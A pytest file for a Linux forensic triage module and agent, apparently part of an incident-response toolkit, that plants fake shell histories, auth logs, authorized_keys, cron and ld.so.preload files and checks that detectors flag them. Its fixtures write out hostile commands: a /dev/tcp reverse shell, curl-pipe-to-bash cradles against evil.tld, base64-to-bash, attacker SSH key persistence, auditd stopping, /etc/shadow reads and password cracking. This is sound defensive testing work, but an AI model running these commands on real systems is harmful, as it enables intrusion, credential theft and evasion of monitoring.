"""Linux forensicator + triage tests.

The skill layer (linux_triage) and agent layer (LinuxForensicatorAgent)
both work on a fake exports tree constructed in tmp_path — same
pattern as every other agent test in this repo. Extraction itself
needs a mounted Linux filesystem so it's tested only in a skipped
smoke-test against the BelkaCTF image when present.
"""
from pathlib import Path

import pytest

from el.skills import linux_triage as lt


def _write(path: Path, content: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content)


# ---------------------------------------------------------------------------
# Shell-history pattern detectors
# ---------------------------------------------------------------------------

def test_reverse_shell_detected(tmp_path):
    _write(tmp_path / "home" / "alice" / ".bash_history",
           "ls\nbash -i >& /dev/tcp/198.51.100.5/4444 0>&1\nexit\n")
    hits = lt.detect_shell_history_malicious(tmp_path)
    assert any(h.family == "reverse_shell" for h in hits)


def test_download_cradle_raw_ip_wget(tmp_path):
    _write(tmp_path / "home" / "bob" / ".bash_history",
           "wget http://198.51.100.9/pwn.sh -O /tmp/p.sh\n")
    hits = lt.detect_shell_history_malicious(tmp_path)
    assert any(h.family == "download_cradle" for h in hits)


def test_curl_piped_to_sh(tmp_path):
    _write(tmp_path / "home" / "bob" / ".bash_history",
           "curl -sSL http://evil.tld/x.sh | bash\n")
    hits = lt.detect_shell_history_malicious(tmp_path)
    assert any(h.family == "download_cradle" for h in hits)


def test_base64_pipe_detected(tmp_path):
    _write(tmp_path / "home" / "c" / ".bash_history",
           "echo aGVsbG8gd29ybGQgYmFzZTY0IHBheWxvYWQ= | base64 -d | bash\n")
    hits = lt.detect_shell_history_malicious(tmp_path)
    assert any(h.family == "base64_pipe" for h in hits)


def test_persistence_ssh_authorized_keys_append(tmp_path):
    _write(tmp_path / "home" / "d" / ".bash_history",
           'echo "ssh-rsa AAA... attacker" >> /root/.ssh/authorized_keys\n')
    hits = lt.detect_shell_history_malicious(tmp_path)
    assert any(h.family == "persistence_ssh" for h in hits)


def test_defense_evasion_auditd_stop(tmp_path):
    _write(tmp_path / "home" / "e" / ".bash_history",
           "systemctl stop auditd\nhistory -c\n")
    hits = lt.detect_shell_history_malicious(tmp_path)
    assert any(h.family == "defense_evasion" for h in hits)


def test_credential_access_cat_shadow(tmp_path):
    _write(tmp_path / "home" / "f" / ".bash_history",
           "sudo cat /etc/shadow > /tmp/s\n")
    hits = lt.detect_shell_history_malicious(tmp_path)
    assert any(h.family == "credential_access" for h in hits)


def test_clean_history_produces_no_hits(tmp_path):
    _write(tmp_path / "home" / "g" / ".bash_history",
           "ls\ncd Documents\nvim report.txt\ngit commit -m 'x'\n")
    assert lt.detect_shell_history_malicious(tmp_path) == []


def test_concealment_tooling_detected(tmp_path):
    """BelkaCTF Kidnapper — Ivan's bash history shows hexedit against a
    mangled-extension PDF and zip2john against a password-protected ZIP.
    These 'concealment' commands indicate user-side evidence hiding / manual
    cracking, distinct from intrusion tooling."""
    _write(tmp_path / "home" / "ivan" / ".bash_history",
           "hexedit /home/ivan/Downloads/letter.txt\n"
           "zip2john Monthly_DB.zip > /tmp/hash.txt\n"
           "john --wordlist=/tmp/rockyou.txt /tmp/hash.txt\n"
           "base32 -d payload.b32 > /tmp/raw\n"
           "chattr +i /home/ivan/.secs\n")
    hits = lt.detect_shell_history_malicious(tmp_path)
    families = {h.family for h in hits}
    assert "concealment_tooling" in families


def test_cracker_wordlist_detected(tmp_path):
    """The '10-million-password-list' file name appeared as a Thunderbird
    attachment on BelkaCTF — presence alone is a strong cracker-tooling
    signal distinct from concealment."""
    _write(tmp_path / "home" / "ivan" / ".bash_history",
           "cp ~/Downloads/10-million-password-list-top-1000.txt /tmp/w\n"
           "hashcat -m 13600 /tmp/hash /tmp/w\n")
    hits = lt.detect_shell_history_malicious(tmp_path)
    families = {h.family for h in hits}
    assert "cracker_tooling" in families


def test_shell_history_returns_multiple_families_in_one_run(tmp_path):
    _write(tmp_path / "home" / "h" / ".bash_history",
           "bash -i >& /dev/tcp/1.2.3.4/9\n"
           "curl -sS http://1.2.3.4/x.sh | bash\n"
           "systemctl stop auditd\n")
    families = {h.family for h in lt.detect_shell_history_malicious(tmp_path)}
    assert "reverse_shell" in families
    assert "download_cradle" in families
    assert "defense_evasion" in families


# ---------------------------------------------------------------------------
# ld.so.preload
# ---------------------------------------------------------------------------

def test_ld_so_preload_empty_or_missing_no_hit(tmp_path):
    # No file at all
    assert lt.detect_ld_so_preload(tmp_path) == []
    # Empty file
    _write(tmp_path / "etc" / "ld.so.preload", "")
    assert lt.detect_ld_so_preload(tmp_path) == []


def test_ld_so_preload_non_empty_fires(tmp_path):
    _write(tmp_path / "etc" / "ld.so.preload",
           "/tmp/.hiddenlib.so\n# comment line\n")
    hits = lt.detect_ld_so_preload(tmp_path)
    assert hits
    assert hits[0].family == "ld_so_preload"
    assert hits[0].event_count == 1
    assert ("T1574.006",
            "Hijack Execution Flow: Dynamic Linker Hijacking") in hits[0].attack


# ---------------------------------------------------------------------------
# auth.log failure bursts
# ---------------------------------------------------------------------------

def _auth_fail(user: str, ip: str) -> str:
    return (f"Jan  1 10:00:00 host sshd[1234]: Failed password for "
            f"invalid user {user} from {ip} port 56789 ssh2")


def test_auth_brute_detected(tmp_path):
    lines = "\n".join(_auth_fail("root", "185.220.101.7")
                       for _ in range(12))
    _write(tmp_path / "var" / "log" / "auth.log", lines + "\n")
    hits = lt.detect_auth_log_failure_burst(tmp_path)
    assert any(h.family == "ssh_brute" for h in hits)


def test_auth_spray_detected(tmp_path):
    lines = "\n".join(_auth_fail(f"user{i}", "185.220.101.7")
                       for i in range(6))
    _write(tmp_path / "var" / "log" / "auth.log", lines + "\n")
    hits = lt.detect_auth_log_failure_burst(tmp_path)
    assert any(h.family == "ssh_spray" for h in hits)


def test_auth_clean_log_no_hits(tmp_path):
    _write(tmp_path / "var" / "log" / "auth.log",
           "Jan  1 10:00:00 host sshd[1]: Accepted publickey for "
           "alice from 10.0.0.5 port 60000 ssh2\n")
    assert lt.detect_auth_log_failure_burst(tmp_path) == []


def test_auth_no_log_dir_no_hits(tmp_path):
    assert lt.detect_auth_log_failure_burst(tmp_path / "missing") == []


# ---------------------------------------------------------------------------
# authorized_keys anomaly
# ---------------------------------------------------------------------------

def test_authorized_keys_kali_comment_flagged(tmp_path):
    _write(tmp_path / "home" / "alice" / ".ssh" / "authorized_keys",
           "ssh-rsa AAAAB3Nza... root@kali\n")
    hits = lt.detect_ssh_authorized_keys_anomaly(tmp_path)
    assert hits
    assert "alice" in hits[0].top_users


def test_authorized_keys_single_legit_key_quiet(tmp_path):
    _write(tmp_path / "home" / "alice" / ".ssh" / "authorized_keys",
           "ssh-ed25519 AAAAC3Nz... alice@corp.example\n")
    assert lt.detect_ssh_authorized_keys_anomaly(tmp_path) == []


def test_authorized_keys_three_plus_keys_flagged(tmp_path):
    _write(tmp_path / "home" / "alice" / ".ssh" / "authorized_keys",
           "ssh-rsa AAA1 a@corp\n"
           "ssh-rsa AAA2 b@corp\n"
           "ssh-rsa AAA3 c@corp\n")
    assert lt.detect_ssh_authorized_keys_anomaly(tmp_path)


# ---------------------------------------------------------------------------
# Cron suspicious path
# ---------------------------------------------------------------------------

def test_cron_tmp_path_flagged(tmp_path):
    _write(tmp_path / "etc" / "crontab",
           "* * * * *  root  /tmp/maliciousscript.sh\n")
    hits = lt.detect_cron_suspicious(tmp_path)
    assert hits
    assert hits[0].family == "cron_suspicious_path"


def test_cron_dev_shm_flagged(tmp_path):
    _write(tmp_path / "etc" / "cron.d" / "backdoor",
           "* * * * *  root  /dev/shm/.b/run\n")
    hits = lt.detect_cron_suspicious(tmp_path)
    assert hits


def test_cron_legit_path_quiet(tmp_path):
    _write(tmp_path / "etc" / "crontab",
           "0 * * * *  root  /usr/local/bin/backup.sh\n")
    assert lt.detect_cron_suspicious(tmp_path) == []


# ---------------------------------------------------------------------------
# run_all coalesces detectors safely
# ---------------------------------------------------------------------------

def test_run_all_empty_dir_no_hits(tmp_path):
    assert lt.run_all(tmp_path) == []


def test_run_all_combines_multiple_families(tmp_path):
    _write(tmp_path / "home" / "alice" / ".bash_history",
           "curl http://1.2.3.4/a | bash\n")
    _write(tmp_path / "etc" / "ld.so.preload",
           "/tmp/.hiddenlib.so\n")
    hits = lt.run_all(tmp_path)
    families = {h.family for h in hits}
    assert "download_cradle" in families
    assert "ld_so_preload" in families


# ---------------------------------------------------------------------------
# Agent wiring
# ---------------------------------------------------------------------------

def test_agent_emits_findings_for_shell_history_hit(tmp_path, monkeypatch):
    from el.agents.base import AgentContext
    from el.agents.linux_forensicator import LinuxForensicatorAgent
    from el.evidence import intake as intake_mod
    from el.evidence.ledger import open_ledger

    monkeypatch.setattr(intake_mod, "CASE_ROOT", tmp_path / "cases")
    src = tmp_path / "disk.E01"; src.write_bytes(b"x")
    m = intake_mod.intake(src, case_id="t-linux-sh")
    with open_ledger(m.case_dir):
        pass

    exports = Path(m.case_dir) / "exports" / "linux-artifacts"
    _write(exports / "home" / "alice" / ".bash_history",
           "bash -i >& /dev/tcp/1.2.3.4/9\n")

    ctx = AgentContext(case_id="t-linux-sh", case_dir=Path(m.case_dir),
                       input_path=src, manifest=m.__dict__,
                       shared={"linux_artifacts_dir": str(exports)})
    findings = LinuxForensicatorAgent().run(ctx)
    rs = [f for f in findings if "reverse_shell" in f.claim.lower()]
    assert rs and rs[0].confidence == "high"
    assert "H_C2_OR_REVERSE_SHELL" in rs[0].hypotheses_supported


def test_agent_insufficient_when_no_exports_dir(tmp_path, monkeypatch):
    from el.agents.base import AgentContext
    from el.agents.linux_forensicator import LinuxForensicatorAgent
    from el.evidence import intake as intake_mod
    from el.evidence.ledger import open_ledger

    monkeypatch.setattr(intake_mod, "CASE_ROOT", tmp_path / "cases")
    src = tmp_path / "x"; src.write_bytes(b"x")
    m = intake_mod.intake(src, case_id="t-linux-nodir")
    with open_ledger(m.case_dir):
        pass
    ctx = AgentContext(case_id="t-linux-nodir",
                       case_dir=Path(m.case_dir),
                       input_path=src, manifest=m.__dict__)
    findings = LinuxForensicatorAgent().run(ctx)
    assert findings and findings[0].confidence == "insufficient"


def test_agent_insufficient_when_no_detector_hits(tmp_path, monkeypatch):
    from el.agents.base import AgentContext
    from el.agents.linux_forensicator import LinuxForensicatorAgent
    from el.evidence import intake as intake_mod
    from el.evidence.ledger import open_ledger

    monkeypatch.setattr(intake_mod, "CASE_ROOT", tmp_path / "cases")
    src = tmp_path / "x"; src.write_bytes(b"x")
    m = intake_mod.intake(src, case_id="t-linux-clean")
    with open_ledger(m.case_dir):
        pass
    exports = Path(m.case_dir) / "exports" / "linux-artifacts"
    _write(exports / "home" / "alice" / ".bash_history",
           "ls\ncd Documents\nvim notes.txt\n")
    ctx = AgentContext(case_id="t-linux-clean",
                       case_dir=Path(m.case_dir),
                       input_path=src, manifest=m.__dict__,
                       shared={"linux_artifacts_dir": str(exports)})
    findings = LinuxForensicatorAgent().run(ctx)
    assert findings and findings[0].confidence == "insufficient"
    assert "not evidence of absence" in findings[0].claim


# ---------------------------------------------------------------------------
# Real-data smoke — skipped unless the BelkaCTF mount is present
# ---------------------------------------------------------------------------

_BELKA = Path("/tmp/el-mounts/belkactf-linux")


@pytest.mark.skipif(
    not (_BELKA.is_dir() and (_BELKA / "etc").exists()),
    reason="BelkaCTF ext4 not mounted at /tmp/el-mounts/belkactf-linux",
)
def test_belkactf_extraction_runs(tmp_path):
    """Smoke test: extract_linux_artifacts must return a non-empty
    dict against the real BelkaCTF image; detectors must not raise."""
    from el.skills.linux_artifacts import extract_linux_artifacts
    extracted = extract_linux_artifacts(_BELKA, tmp_path)
    assert any(v > 0 for v in extracted.values())
    hits = lt.run_all(tmp_path)
    # No pattern match is the RIGHT answer here — CTF attacker
    # activity doesn't trip the noisy-tooling signatures — but the
    # call must run without raising.
    assert isinstance(hits, list)
